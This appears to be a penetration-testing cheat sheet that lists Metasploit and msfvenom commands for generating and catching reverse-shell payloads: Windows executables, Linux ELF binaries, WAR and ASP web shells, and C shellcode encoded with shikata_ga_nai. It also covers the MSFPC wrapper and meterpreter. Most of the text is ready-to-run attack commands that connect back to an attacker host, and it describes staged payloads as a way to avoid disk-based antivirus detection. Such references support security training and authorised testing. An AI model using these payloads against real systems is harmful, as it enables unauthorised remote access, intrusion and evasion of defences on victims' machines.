# Common payloads

## Metasploit Multi-handler

Start Metasploit:

    msfconsole

Set multi handler module:

    use exploit/multi/handler

Set up a shell:

    set payload windows/x64/shell/reverse_tcp
    set payload windows/shell/reverse_tcp
    set payload windows/meterpreter/reverse_tcp
    set payload linux/x64/shell/reverse_tcp
    set payload linux/x86/shell/reverse_tcp
    set payload java/jsp_shell_reverse_tcp

Set options:

    set LHOST <IP address attack machine>

Start:

    run

## MSFvenom

MSFvenom is the one-stop-shop for all things payload related. The standard syntax for `msfvenom`:

    msfvenom -p <PAYLOAD> <OPTIONS>

* Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is 
executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any 
reverse shell code by itself. Instead, it connects to the listener and uses the connection to load the real payload, 
executing it directly and preventing it from touching the disk where it could be caught by traditional antivirus 
solutions. Thus, the payload is split into two parts -- a small initial stager, then the bulkier reverse shell 
code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually the 
Metasploit `multi/handler`.
* Stageless payloads are more common. They are entirely self-contained in that there is one piece of code which, 
when executed, sends a shell back immediately to the waiting listener.

Stageless payloads are denoted with underscores (`_`). A Linux 32bit stageless meterpreter payload:

    msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf -o shell LHOST=<IP address attack machine> LPORT=<port-number>

Staged payloads are denoted with another forward slash (`/`). A staged meterpreter reverse shell for a 64bit Linux 
target:

    msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=<IP address attack machine> LPORT=<port-number>

To generate a Windows x64 Reverse Shell in an `.exe` format:

    msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<IP address attack machine> LPORT=<port-number>

Buffer overflow code for Linux with bad characters in C:

    msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 -f c -b "\x00" –e x86/shikata_ga_nai

Linux payload for `bash`:

    msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 CMD=/bin/bash -f js_le -e generic/none

Java payload to a `.war` file:

    msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 -f war > shell.war

Microsoft Windows `asp` reverse shell:

    msfvenom -p windows/shell_reverse_tcp -f asp LHOST=<attacking-ipaddress> LPORT=4444 -o shell.asp

Windows executable reverse shell:

    msfvenom -p windows/shell/reverse_tcp LHOST=<attacking-ipaddress> LPORT=4444 -e x86/shikata_ga_nai X > shell.exe

## MSFPC

MSFvenom Payload Creator (MSFPC) is a wrapper to generate multiple types of payloads, based on users choice. 
The idea is to be as simple as possible (only requiring one input) to produce their payload.

    $ msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>)
    (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>)
    (<VERBOSE>)

* TYPE is the `-f` switch in msfvenom
* DOMAIN/IP is the LHOST option
* PORT is the LPORT option
* CMD/MSF is the type of shell dropped once the payload is executed on the target system.
* BATCH/LOOP to generate multiple payloads (multiple OS platforms) with a single command.

A classic reverse shell payload (generating a payload with a `cmd` as the preferred shell for
Windows, setting the LHOST to the IP retrieved from the eth0 Ethernet interface of the Kali machine):

    $ msfpc cmd windows eth0
    
Two files are created, an executable payload by name of `windows-shell-staged-reverse-tcp-443.exe`, and a 
resource file named `windows-shell-staged-reverse-tcp-443-exe.rc`, useful for automating repetitive tasks in 
Metasploit. Resource scripts can chain series of Metasploit console commands and directly embed Ruby to do 
things such as call APIs, interact with objects in the database, and iterate actions.

Drop msf windows:

    $ msfpc msf windows eth0

The payload is now set to a `windows/meterpreter/reverse_tcp`. 
The associated resource file can be executed with:

    msfconsole -q -r 'windows-meterpreter-staged-reverse-tcp-443-exe.rc'

When the payload is executed, the stager will request for other parts of the payload to be
sent over to the target server. These parts of the payload will be sent by payload handler
and the complete staged payload is delivered to the victim machine.

MSFvenom Payload Creator is preinstalled in Kali. On other *nix, install it with:

    git clone https://github.com/g0tmi1k/mpc

Set execute permission on the `msfpc.sh` file:

    cd mpc/
    chmod +x msfpc.sh

Start her up with:

    ./msfpc.sh

## Meterpreter shells

Meterpreter shells are completely stable, making them a very good thing when working with Windows targets. They 
also have a lot of inbuilt functionality, such as file uploads and downloads. If we want to use any of Metasploit's 
post-exploitation tools then we need to use a meterpreter shell.

The downside to meterpreter shells is that they must be caught in Metasploit. They are also banned from certain 
certification examinations, so it is a good idea to learn alternative methodologies just for that.

## Resources

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)